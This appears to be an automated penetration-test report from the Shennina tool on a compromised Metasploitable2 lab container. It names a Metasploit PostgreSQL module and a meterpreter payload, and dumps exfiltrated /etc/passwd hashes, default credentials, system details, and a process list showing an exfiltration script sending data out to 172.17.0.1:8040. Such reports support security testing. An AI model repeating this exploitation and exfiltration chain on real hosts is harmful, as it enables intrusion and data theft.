
# Shennina Exploitation Report

## Target: `172.17.0.2`

#### The target has been compromised using the following:


## Exploit: `exploit/linux/postgres/postgres_payload`

## Exploit Details

### Name

```
PostgreSQL for Linux Payload Execution
```

### Description

```
On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.
```

### References

```
CVE-2007-3280
http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt
```

## Shell Type: `meterpreter`

## Payload: `payload/linux/x86/meterpreter/bind_ipv6_tcp`



---

# Data Obtained From Target via Exfiltration Server
### files_etc_passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
metasploit:$1$Az$kf0BaRSqaSF9ewhqk5sMa.:1079:1079::/:/bin/sh
metasploit:$1$Az$kf0BaRSqaSF9ewhqk5sMa.:1805:1805::/:/bin/sh

```

### files_etc_issue

```
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started



```

### ifconfig

```
eth0      Link encap:Ethernet  HWaddr 02:42:ac:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8503 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7180 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:4149214 (3.9 MB)  TX bytes:769335 (751.3 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:648 errors:0 dropped:0 overruns:0 frame:0
          TX packets:648 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:294085 (287.1 KB)  TX bytes:294085 (287.1 KB)


```

### uname

```
Linux metasploitable2 6.2.0-37-generic #38~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov  2 18:01:13 UTC 2 x86_64 GNU/Linux

```

### id_command

```
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)

```

### user

```
postgres

```

### ps_aux

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2788  2176 pts/0    Ss   06:11   0:00 sh -c /bin/services.sh && bash
root          41  0.0  0.0  10664  4940 ?        Ss   06:11   0:00 /usr/sbin/apache2 -k start
daemon        77  0.0  0.0   2052  1024 ?        Ss   06:11   0:00 /usr/sbin/atd
root         108  0.0  0.0   2172  1536 ?        Ss   06:11   0:00 /usr/sbin/cron
daemon       131  0.0  0.0   2384  1024 ?        SNs  06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       132  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         185  0.0  0.0   2836  2176 pts/0    S    06:11   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        227  0.0  0.0 135916 20236 pts/0    Sl   06:11   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root         228  0.0  0.0   1768  1152 pts/0    S    06:11   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
daemon       239  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       416  0.0  0.0   6004  1152 ?        Ss   06:11   0:00 /sbin/portmap
daemon       421  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         504  0.0  0.0   5480  2944 ?        Ss   06:11   0:00 /usr/lib/postfix/master
postfix      508  0.0  0.0   5488  3072 ?        S    06:11   0:00 pickup -l -t fifo -u -c
postfix      510  0.0  0.0   5528  2944 ?        S    06:11   0:00 qmgr -l -t fifo -u
postgres     548  0.0  0.0  41408  8704 ?        S    06:11   0:00 /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
postgres     550  0.0  0.0  41408  3712 ?        Ss   06:11   0:01 postgres: writer process                                                                                                    
postgres     551  0.0  0.0  41408  3456 ?        Ss   06:11   0:01 postgres: wal writer process                                                                                                
postgres     552  0.0  0.0  41544  3712 ?        Ss   06:11   0:00 postgres: autovacuum launcher process                                                                                       
postgres     553  0.0  0.0  12728  3200 ?        Ss   06:11   0:00 postgres: stats collector process                                                                                           
daemon       555  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       562  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
proftpd      600  0.0  0.0  10016  2652 ?        Ss   06:11   0:00 proftpd: (accepting connections)
root         661  0.0  0.0   5456  2372 ?        Ss   06:11   0:00 /usr/sbin/nmbd -D
root         663  0.0  0.0   7792  3868 ?        Ss   06:11   0:00 /usr/sbin/smbd -D
root         682  0.0  0.0   7792  2264 ?        S    06:11   0:00 /usr/sbin/smbd -D
snmp         687  0.0  0.0   8688  5784 ?        S    06:11   0:00 /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
root         719  0.0  0.0   5380  3080 ?        Ss   06:11   0:00 /usr/sbin/sshd
syslog       769  0.0  0.0   6104  5376 ?        Ss   06:11   0:00 /sbin/syslogd -u syslog
root         811  0.0  0.0   2120  1024 ?        Ss   06:11   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root         812  0.0  0.0   2120  1152 ?        S    06:11   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
tomcat55     813  0.1  0.3 374812 99840 ?        Sl   06:11   0:09 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root         924  0.0  0.0  75932 30464 pts/0    Sl   06:11   0:00 /usr/bin/rmiregistry
root         928  0.3  0.0  12276  3328 pts/0    Sl   06:11   0:18 ruby /usr/sbin/druby_timeserver.rb
root         932  0.0  0.0   2904  2304 pts/0    S+   06:11   0:00 bash
root         950  0.0  0.0  14112 13048 pts/0    S    06:11   0:02 Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
root         952  0.0  0.0   8608  3808 pts/0    S    06:11   0:00 /usr/bin/unrealircd
daemon       955  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         956  0.0  0.0   2492  1664 ?        Ss   06:11   0:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
root         962  0.0  0.0   2792  2176 pts/0    S    06:11   0:00 /bin/sh /root/.vnc/xstartup
root         965  0.0  0.0   6004  4224 pts/0    S    06:11   0:00 xterm -geometry 80x24+10+10 -ls -title X Desktop
root         967  0.0  0.0   9056  7328 pts/0    S    06:11   0:02 fluxbox
daemon       971  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root        1001  0.0  0.0   2912  2304 pts/1    Ss+  06:11   0:00 -bash
daemon      1015  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1016  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1050  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1051  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1052  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1053  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1054  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1055  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1056  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1057  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon      1058  0.0  0.0   2384   512 ?        SN   06:11   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
postfix     1081  0.0  0.0   5856  4608 ?        S    06:18   0:00 tlsmgr -l -t unix -u -c
www-data    1161  0.0  0.0  10800  3360 ?        S    06:31   0:00 /usr/sbin/apache2 -k start
www-data    1162  0.0  0.0  10796  3232 ?        S    06:31   0:00 /usr/sbin/apache2 -k start
www-data    1163  0.0  0.0  10800  3360 ?        S    06:31   0:00 /usr/sbin/apache2 -k start
www-data    1164  0.0  0.0  10796  3360 ?        S    06:31   0:00 /usr/sbin/apache2 -k start
www-data    1165  0.0  0.0  10796  3232 ?        S    06:31   0:00 /usr/sbin/apache2 -k start
www-data    3970  0.0  0.0  10796  3360 ?        S    06:59   0:00 /usr/sbin/apache2 -k start
www-data    4024  0.0  0.0  10796  3488 ?        S    07:07   0:00 /usr/sbin/apache2 -k start
www-data    4118  0.0  0.0  10796  3360 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
www-data    4121  0.0  0.0  10796  3488 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
www-data    4135  0.0  0.0  10800  3360 ?        S    07:09   0:00 /usr/sbin/apache2 -k start
root        4310  0.0  0.0   1232  1024 ?        SNl  07:27   0:00 /tmp/iPUCk
postgres    4390  0.0  0.0  43456  2472 ?        S    07:44   0:00 postgres: postgres template1 172.17.0.1(34521) CREATE FUNCTION                                                              
postgres    4394  0.0  0.0   3308  2432 ?        S    07:45   0:00 sh /tmp/.75468bc2-4532-4f9b-9751-39d7be367354.sh 172.17.0.1:8040 75468bc2-4532-4f9b-9751-39d7be367354
postgres    4395  0.0  0.0   3408  1868 ?        S    07:45   0:00 sh /tmp/.75468bc2-4532-4f9b-9751-39d7be367354.sh 172.17.0.1:8040 75468bc2-4532-4f9b-9751-39d7be367354
postgres    4437  0.0  0.0   3360  1620 ?        S    07:45   0:00 sh /tmp/.75468bc2-4532-4f9b-9751-39d7be367354.sh 172.17.0.1:8040 75468bc2-4532-4f9b-9751-39d7be367354
postgres    4438  0.0  0.0   2432  1664 ?        R    07:45   0:00 ps aux
postgres    4439  0.0  0.0   3360  1876 ?        S    07:45   0:00 sh /tmp/.75468bc2-4532-4f9b-9751-39d7be367354.sh 172.17.0.1:8040 75468bc2-4532-4f9b-9751-39d7be367354
postgres    4440  0.0  0.0   1776   768 ?        S    07:45   0:00 xxd -ps /dev/stdin
postgres    4441  0.0  0.0   1804   768 ?        S    07:45   0:00 tr -d ?

```

### suggested_exploits

```

Available information:

Kernel version: 6.2.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): N/A
Package listing: N/A

Searching among:

72 kernel space exploits
0 user space exploits

Possible Exploits:


```

